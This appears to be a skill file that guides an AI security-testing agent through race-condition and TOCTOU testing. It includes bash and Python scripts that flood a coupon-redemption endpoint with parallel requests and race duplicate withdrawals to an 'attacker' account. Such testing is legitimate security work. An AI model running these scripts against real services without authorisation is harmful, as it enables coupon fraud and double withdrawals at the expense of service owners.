---
name: noir-race
description: "Race condition and concurrency testing. Use when testing endpoints that handle state changes, transactions, or resource limits. Trigger keywords: race, race condition, toctou, time-of-check, concurrency, thread, parallel."
---

# Race Condition Testing

## Goal
Identify time-of-check-time-of-use (TOCTOU) vulnerabilities and race conditions in concurrent request handling.

## Steps

### 1. Identify Race-Prone Endpoints

Look for:
- Coupon/voucher redemption
- Ticket booking or seat reservation
- Fund transfer or withdrawal
- Inventory decrement
- Account registration with unique constraints
- Rate-limited endpoints

### 2. Concurrent Request Testing

```bash
# Create a shell script for parallel requests
cat > /tmp/race.sh << 'EOF'
for i in $(seq 1 20); do
  curl -s -X POST "https://target.com/coupon/redeem" \
    -d "code=DISCOUNT50&user=test$i" &
done
wait
EOF

# Or use python for precise timing
python3 << 'PYEOF'
import threading, requests, time

url = "https://target.com/coupon/redeem"
data = {"code": "DISCOUNT50", "user": "test"}
results = []

def send_request():
    try:
        r = requests.post(url, data=data, timeout=5)
        results.append(r.status_code)
    except:
        results.append(None)

# Fire 20 requests simultaneously
threads = [threading.Thread(target=send_request) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()

success = [r for r in results if r == 200]
print(f"Success count: {len(success)} out of {len(results)}")
PYEOF
```

### 3. Single-Endpoint Race

Race the same endpoint with the same payload — if more than one succeeds when only one should, it's a race condition.

### 4. Multi-Step Race

If an operation spans multiple requests (e.g., create then verify), try racing the verification step:

```bash
# Request 1: initiate action (e.g., start withdrawal)
# Request 2: immediately before Request 1 completes, initiate another
python3 << 'PYEOF'
import requests, threading

session = requests.Session()
url1 = "https://target.com/account/withdraw"
url2 = "https://target.com/account/withdraw"
data = {"amount": 100, "account": "attacker"}

results = []
def req1():
    results.append(session.post(url1, data=data).status_code)
def req2():
    results.append(session.post(url2, data=data).status_code)

t1 = threading.Thread(target=req1)
t2 = threading.Thread(target=req2)
t1.start(); t2.start()
t1.join(); t2.join()

# If both return 200, race condition exists
print(f"Both succeeded: {results.count(200) == 2}")
PYEOF
```

## Detection

- Multiple 200 responses for operations that should be single-use
- Database constraint violations in responses
- Duplicate resource creation (two accounts with same email, two tickets with same seat)
- Balance discrepancies

## Output

Log: endpoint, technique used, number of successful concurrent requests, evidence.
